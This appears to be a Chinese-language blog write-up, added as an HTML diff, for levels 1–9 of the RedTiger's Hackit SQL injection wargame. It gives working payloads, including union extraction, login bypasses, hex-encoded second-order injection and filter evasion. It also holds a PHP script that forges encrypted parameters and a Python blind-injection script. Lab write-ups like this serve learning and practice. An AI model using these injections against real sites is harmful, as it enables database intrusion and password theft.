@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>RedTiger&#39;s Hackit Write Up</title>
+    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta name="keywords" content='Web'>
+
+    <meta property="og:url" content="https://kingbridgess.github.io/posts/redtigers-hackit/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="RedTiger&#39;s Hackit Write Up">
+    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="og:image" content="/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="RedTiger&#39;s Hackit Write Up">
+    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/redtigers-hackit/">
+    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/redtigers-hackit/">
+    <meta name="twitter:image" content="/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="https://kingbridgess.github.io/posts/redtigers-hackit/" />
+
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">
+
+    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://kingbridgess.github.io">
+                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/about"> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/about"> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>RedTiger&#39;s Hackit Write Up</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            November 6, 2021
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p>网址：https://redtiger.labs.overthewire.org/</p>
+<h1 id="level1">level1</h1>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/98dfd3f98d9d41129351ee191cd65988~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>对着登陆框跑字典直接没有用，遂无思路。跑去看答案，发现点击category会直接传参&hellip;</p>
+<p><code>https://redtiger.labs.overthewire.org/level1.php?cat=1</code></p>
+<p>把get方法?cat=1改成?cat=2-1，正常回显，所以是不带引号的数字型注入。输入以下payload:
+<code>cat=-1 union select group_concat(column_name) from information_schema.columns where table_name=level1_users</code></p>
+<p>直接回显&quot;some things is disable&quot;于是又卡住。直接看答案，发现我简直在乱搞。正确思路是：</p>
+<p>1.<code>cat=1 order by i #</code>通过增大i的值判断当前表有几列。事实上有4列，i&gt;4无法正常回显。</p>
+<p>2.<code>cat=-1 union select 1,2,3,4 #</code>判断前端显示的是哪几列。本题中显示3，4</p>
+<p>3.由于给了表名，结合盲猜字段，输入<code>cat=-1 union select 1,2,Username,Password from level1_users #</code>得到答案。</p>
+<h1 id="level2">level2</h1>
+<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7a2d81e44c6f4d2fac507b970b576fa5~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>提示condition,账号密码都填<code>' or 1=1 #</code>就能过</p>
+<h1 id="level3">level3</h1>
+<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b693b7f75f3433d89209624151cfb68~tplv-k3u1fbpfcp-watermark.image?" alt="image.png">
+目标：得到Admin密码</p>
+<p>点show userdetails，发现get了一个这个东西：<code>usr=MDQyMjExMDE0MTgyMTQw</code></p>
+<p>然后显示了这个表</p>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8d47516a9002489f95b3c781e15a1bf5~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>显然我们要改usr来查表。但是usr加密了，直接不会。提示说利用报错，但我半天没搞出来报错。瞅了下答案，发现这信息检索绝了：</p>
+<p>get一个数组就能引起报错。访问<code>https://redtiger.labs.overthewire.org/level3.php?usr[]</code></p>
+<p>报错</p>
+<p><strong>Warning</strong>: preg_match() expects parameter 2 to be string, array given in <strong>/var/www/html/hackit/urlcrypt.inc</strong> on line <strong>26</strong></p>
+<p>然后直接访问</p>
+<p><code>https://redtiger.labs.overthewire.org/urlcrypt.inc</code></p>
+<p>control+U看源码，发现加密和解密源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// warning! ugly code ahead :)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// requires php5.x, sorry for that
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  		
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">encrypt</span>(<span style="color:#8be9fd;font-style:italic">$str</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">$cryptedstr</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>		srand(<span style="color:#bd93f9">3284724</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> strlen(<span style="color:#8be9fd;font-style:italic">$str</span>); <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">++</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">$temp</span> <span style="color:#ff79c6">=</span> ord(substr(<span style="color:#8be9fd;font-style:italic">$str</span>,<span style="color:#8be9fd;font-style:italic">$i</span>,<span style="color:#bd93f9">1</span>)) <span style="color:#ff79c6">^</span> rand(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">255</span>);
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">while</span>(strlen(<span style="color:#8be9fd;font-style:italic">$temp</span>)<span style="color:#ff79c6">&lt;</span><span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#8be9fd;font-style:italic">$temp</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;0&#34;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$temp</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">$cryptedstr</span> <span style="color:#ff79c6">.=</span> <span style="color:#8be9fd;font-style:italic">$temp</span><span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> base64_encode(<span style="color:#8be9fd;font-style:italic">$cryptedstr</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">decrypt</span> (<span style="color:#8be9fd;font-style:italic">$str</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		srand(<span style="color:#bd93f9">3284724</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#39;%^[a-zA-Z0-9/+]*={0,2}$%&#39;</span>,<span style="color:#8be9fd;font-style:italic">$str</span>))
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">$str</span> <span style="color:#ff79c6">=</span> base64_decode(<span style="color:#8be9fd;font-style:italic">$str</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$str</span> <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">$str</span> <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">$str</span> <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">false</span>)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#8be9fd;font-style:italic">$decStr</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>				
+</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> strlen(<span style="color:#8be9fd;font-style:italic">$str</span>); <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">+=</span><span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					<span style="color:#8be9fd;font-style:italic">$array</span>[<span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> substr(<span style="color:#8be9fd;font-style:italic">$str</span>,<span style="color:#8be9fd;font-style:italic">$i</span>,<span style="color:#bd93f9">3</span>);
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">foreach</span>(<span style="color:#8be9fd;font-style:italic">$array</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$s</span>)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					<span style="color:#8be9fd;font-style:italic">$a</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">^</span> rand(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">255</span>);
+</span></span><span style="display:flex;"><span>					<span style="color:#8be9fd;font-style:italic">$decStr</span> <span style="color:#ff79c6">.=</span> chr(<span style="color:#8be9fd;font-style:italic">$a</span>);
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>				
+</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$decStr</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>随机数种子固定，可以直接写exploit把想要注入的语句加密。接下来的思路就和level1一样了，过程写在下面的exploit里面了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">encrypt</span>(<span style="color:#8be9fd;font-style:italic">$str</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">$cryptedstr</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>		srand(<span style="color:#bd93f9">3284724</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> strlen(<span style="color:#8be9fd;font-style:italic">$str</span>); <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">++</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">$temp</span> <span style="color:#ff79c6">=</span> ord(substr(<span style="color:#8be9fd;font-style:italic">$str</span>,<span style="color:#8be9fd;font-style:italic">$i</span>,<span style="color:#bd93f9">1</span>)) <span style="color:#ff79c6">^</span> rand(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">255</span>);
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">while</span>(strlen(<span style="color:#8be9fd;font-style:italic">$temp</span>)<span style="color:#ff79c6">&lt;</span><span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#8be9fd;font-style:italic">$temp</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;0&#34;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$temp</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">$cryptedstr</span> <span style="color:#ff79c6">.=</span> <span style="color:#8be9fd;font-style:italic">$temp</span><span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> base64_encode(<span style="color:#8be9fd;font-style:italic">$cryptedstr</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">#$payload=&#34;admin&#39; order by 8 #&#34;;#最大到7
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">#$payload=&#34;&#39; union select 1,2,3,4,5,6,7 #&#34;#26754都行
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">$payload</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#39; union select 1,password,3,4,5,6,7 from level3_users where username=&#39;Admin&#39; #&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">echo</span> encrypt(<span style="color:#8be9fd;font-style:italic">$payload</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><h1 id="level4">level4</h1>
+<p>(第一次用requests.get，第一次盲注字段值长度。以后忘了可以回来再忘一次)</p>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/67f3420738aa49d289ea26bd5d120ef8~tplv-k3u1fbpfcp-watermark.image?" alt="image.png">
+提示盲注。点击click me会get[?id=1],回显的行数写在quert returned i rows里。此时回显1行</p>
+<p>尝试输入：<code>id=1 union select 1,2 from level4_secret #</code>回显2行，说明可以在后面加where和布尔值</p>
+<p>构造payload:</p>
+<p><code>1 union select 1,2 from level4_secret where [bool] #</code></p>
+<p>[bool]里边塞布尔表达式</p>
+<p>脚本如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://redtiger.labs.overthewire.org/level4.php&#39;</span>
+</span></span><span style="display:flex;"><span>flag_true<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;Query returned 2 rows.&#39;</span>
+</span></span><span style="display:flex;"><span>result <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>cookies <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;level4login&#39;</span> : <span style="color:#f1fa8c">&#39;put_the_kitten_on_your_head&#39;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">22</span>):<span style="color:#6272a4">#左闭右开</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    high = 50
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    low = 0&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    high <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">127</span>
+</span></span><span style="display:flex;"><span>    low <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">32</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    mid <span style="color:#ff79c6">=</span> (high <span style="color:#ff79c6">+</span> low) <span style="color:#ff79c6">//</span> <span style="color:#bd93f9">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> high <span style="color:#ff79c6">&gt;</span> low:
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">#字长21</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">#bool=&#34;length((select keyword from level4_secret))&gt;{}&#34;.format(mid)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">#字段值</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">bool</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;ascii(mid((select keyword from level4_secret),</span><span style="color:#f1fa8c">{index}</span><span style="color:#f1fa8c">,1))&gt;</span><span style="color:#f1fa8c">{char}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(index<span style="color:#ff79c6">=</span>i, char<span style="color:#ff79c6">=</span>mid)<span style="color:#6272a4">#length(())双重括号不能省</span>
+</span></span><span style="display:flex;"><span>        payload<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1 union select 1,2 from level4_secret where </span><span style="color:#f1fa8c">{boolean}</span><span style="color:#f1fa8c"> #&#34;</span><span style="color:#ff79c6">.</span>format(boolean<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">bool</span>)
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;id&#39;</span>:payload}
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url<span style="color:#ff79c6">=</span>url, params<span style="color:#ff79c6">=</span>data,cookies<span style="color:#ff79c6">=</span>cookies)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> flag_true <span style="color:#ff79c6">in</span> response<span style="color:#ff79c6">.</span>text:
+</span></span><span style="display:flex;"><span>            low <span style="color:#ff79c6">=</span> mid <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>            high <span style="color:#ff79c6">=</span> mid
+</span></span><span style="display:flex;"><span>        mid <span style="color:#ff79c6">=</span> (high <span style="color:#ff79c6">+</span> low) <span style="color:#ff79c6">//</span> <span style="color:#bd93f9">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;i=&#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i))
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#result += str(mid)</span>
+</span></span><span style="display:flex;"><span>    result<span style="color:#ff79c6">+=</span><span style="color:#8be9fd;font-style:italic">chr</span>(mid)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(result)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;output:&#34;</span><span style="color:#ff79c6">+</span>result)
+</span></span></code></pre></div><h1 id="level5">level5</h1>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/436f9521f1e348ea8b9b11ae1150fa15~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>提示password被md5加密了，还要观察login errors</p>
+<p>账号密码乱输，回显<code>User not found!</code></p>
+<p>账号输入<code>' or 1=1 #</code>，密码乱输，回显<code>Login failed!</code></p>
+<p>说明有两层验证，第一层是验证是否有返回值的</p>
+<p>盲猜(?)后端逻辑如下</p>
+<pre tabindex="0"><code>if(select xxx from xxx where username=&#39;pay1&#39;有返回值){
+psw=(select password from xxx where username=&#39;pay1&#39;);※
+if(md5(pay2)==psw){冲冲冲}
+}
+</code></pre><p>思路：让※中的语句选出md5(pay2)</p>
+<p>1.第一层验证</p>
+<p>分别输入</p>
+<p><code>select username,password from xxx where username='' union select 1 #</code></p>
+<p><code>select username,password from xxx where username='' union select 1,2 #</code></p>
+<p>分别回显</p>
+<p><code>Login failed!</code></p>
+<p><code>User not found!</code></p>
+<p>说明payload<code>' union select 1,2 #</code>可以bypass</p>
+<p>2.第二层验证</p>
+<p><code>select password from xxx where username='' union select 1,md5('fuck') #</code></p>
+<p><code>select password from xxx where username='' union select md5('fuck'),2 #</code></p>
+<p>都试一遍，事实上第一条可以bypass</p>
+<p>最终payload：账号<code>' union select 1,md5('fuck') #</code>，密码<code>fuck</code></p>
+<h1 id="level6二次注入16进制绕过">level6(二次注入+16进制绕过)</h1>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e6a6088c8bc642b3b481988628c8c0ec~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>常规操作，order+union select，然后会在这一步卡住</p>
+<p><code>?user=-1 union select 1,2,3,4,5 #</code>回显<code>User not found</code></p>
+<p>尝试用给定的用户名&rsquo;deddlef&rsquo;替换1，2，3，4，5，都回显<code>User not found</code>，猜测引号过滤。所以把deddlef转16进制为0x646564646c6566，替换1，2，3，4，5，替换到2的时候正常回显</p>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/35d7e13750644fdd873dc839f38ed347~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>所以可以在2处二次注入（以下语句实际上要转16进制）:</p>
+<p><code>' union select 1,2,3,4,5#</code></p>
+<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/509c771b055340a99d5b23ca029cc7a1~tplv-k3u1fbpfcp-watermark.image?" alt="image.png">
+<code>' union select 1,Username,3,Password,5 from level6_users where status=1 limit 0,1#</code></p>
+<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/99b9571ffef24778b874924f6af3555d~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>最终payload:</p>
+<p><code>http://redtiger.labs.overthewire.org/level6.php?user=-1 union select 1,0x2720756e696f6e2073656c65637420312c557365726e616d652c332c50617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d31206c696d697420302c3123,3,4,5 #</code></p>
+<p>后记：<del>sql注入真好玩，虽然</del>每题都要看wp呜呜呜</p>
+<h1 id="level7">level7</h1>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b2eed0239d31482ab6e7f534fc5d562c~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>搜索<code>google</code>可以看到目标文章。</p>
+<p>搜索<code>'</code>可以看到报错，甚至能偷窥后端sql语句</p>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c4beb632046842608c075cd537620141~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>也就是说，我们免去了查列数，查回显列的步骤。搜索</p>
+<p><code>fuck%') union select news.*,text.text,autor FROM level7_news news, level7_texts text WHERE text.id = news.id and (text.title='Google: The browser is the computer') --  </code></p>
+<p>(注：1.直接搜索fuck无回显2.&ndash;后有空格)</p>
+<p>发现&ndash; 被过滤了(题目里也有说)</p>
+<p>在bp里分别用+,%20(url中的空格)替换空格，都被过滤了。</p>
+<p>搜了一下，这里可以用%a0替换空格（为啥啊555）</p>
+<p>最终payload(注意用bp发)</p>
+<p><code>search=fuck%') union select news.*,text.text,autor FROM level7_news news, level7_texts text WHERE text.id = news.id and (text.title='Google: The browser is the computer') --%a0&amp;dosearch=search%21 </code></p>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/32e9b1c1001b4d158b6575e4f5285064~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<h1 id="level8">level8</h1>
+<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e9b4188945104e9cb1444f157e5138a4~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>email填&rsquo;报错</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;12345&rsquo;, age = &lsquo;25&rsquo; WHERE id = 1&rsquo; at line 3 Username: Admin</p>
+<p>后端语句应该是</p>
+<p>update xxx set email=&lsquo;hans@localhost&rsquo;,name=&lsquo;hans&rsquo;,icq=&lsquo;12345&rsquo;,age=&lsquo;25&rsquo;;</p>
+<p>试了一下，发现井号什么的被过滤了，而且只能在email上做文章。</p>
+<p>email填<code>',name=password,age='</code>,名字就会变成密码</p>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/017f7db81d764aaca1a6bccec209fcf8~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<h1 id="level9insert">level9:(insert)</h1>
+<p>一个提交文章的界面，提交后文章可显示在前端</p>
+<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2c27807c623d4252b60391615d73706f~tplv-k3u1fbpfcp-watermark.image?" alt="image.png"></p>
+<p>注入点在第三个输入框，因为输入单引号会报错（引号都不能用写个der的文章xD）</p>
+<p>后端语句为</p>
+<p><code>insert into art (name, title, content) values ('pay1','pay2','pay3');</code></p>
+<p>利用values后可以接多个元组，构造payload</p>
+<p><code>autor=aaa&amp;title=aaa&amp;text=aaa'),((select group_concat(username,password) from level9_users limit 0,1),'aaa','aaa&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></p>
+<p>得到第一条用户的账号密码</p>
